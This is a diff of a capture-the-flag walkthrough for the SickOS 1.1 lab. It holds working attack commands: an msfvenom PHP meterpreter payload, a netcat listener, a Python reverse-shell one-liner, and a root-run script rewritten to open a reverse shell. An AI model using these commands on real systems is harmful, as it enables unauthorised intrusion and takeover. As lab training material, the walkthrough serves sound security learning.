@@ -1,6 +1,7 @@
+[*]
 1. Discover host: netdiscover -i eth0 -r 172.16.16.0/24
 172.16.16.15    08:00:27:89:2c:d1      1      60  PCS Systemtechnik GmbH  
-
+[*]
 2. Scan host
 root@hostmachine:~/vulnhubdb# nmap -sV 172.16.16.15
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-12 13:42 CDT
@@ -13,29 +14,29 @@ PORT     STATE  SERVICE    VERSION
 8080/tcp closed http-proxy
 MAC Address: 08:00:27:89:2C:D1 (Oracle VirtualBox virtual NIC)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
+[*]
 3. Added squid proxy to firefox, and tried to go to page: http://172.16.16.15
 !success
-
+[*]
 4. No real web page, simply visited /robots.txt and found:
 User-agent: *
 Disallow: /
 Dissalow: /wolfcms
 
 **robots.txt seems to be mis-configured** yet another CMS
-
+[*]
 5. Visited http://172.16.16.15/wolfcms/ to confirm existence. Poked around source code on all links, and didn't see anything out of the ordinary. I googled what the admin login page is for wolfcms and found http://172.16.16.15/?/wolfcms
-
+[*]
 6. Tried admin/admin on login and got success. I found that there was a upload option.
-
+[*]
 7. Generated reverse shell(PHP) 
 msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.16.4 LPORT=4444 -o shell.php
-
+[*]
 8. Set listener, and uploaded shell
 nc -nvlp 4444
-
+[*]
 9. Kick of shell: http://172.16.16.15/wolfcms/public/themes/wolf/shell.php
-
+[*]
 10. I had issues with the shell so I had to upload a webshell
 <html>
 <body>
@@ -54,26 +55,24 @@ nc -nvlp 4444
 </body>
 <script>document.getElementById("cmd").focus();</script>
 </html>
-
+[*]
 11. Gave command for reverse shell via python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.16.4",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
+[*]
 12. Upgrade shell
 python2.7 -c 'import pty; pty.spawn("/bin/bash")'
-
+[*]
 13. In /var/www found connect.py running as root with rw/rw/rw, and modifed exploit in it
-
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
 s.connect(("10.11.0.50",4444));
 os.dup2(s.fileno(),0); 
 os.dup2(s.fileno(),1); 
 os.dup2(s.fileno(),2);
 p=subprocess.call(["/bin/sh","-i"]);
-
-
+[*]
 14. Upgrade shell
 python2.7 -c 'import pty; pty.spawn("/bin/bash")'
-
+[*]
 15. Grab flag
 If you are viewing this!!
 
@@ -81,6 +80,6 @@ ROOT!
 
 You have Succesfully completed SickOS1.1.
 Thanks for Trying
-
+[*]
 
 
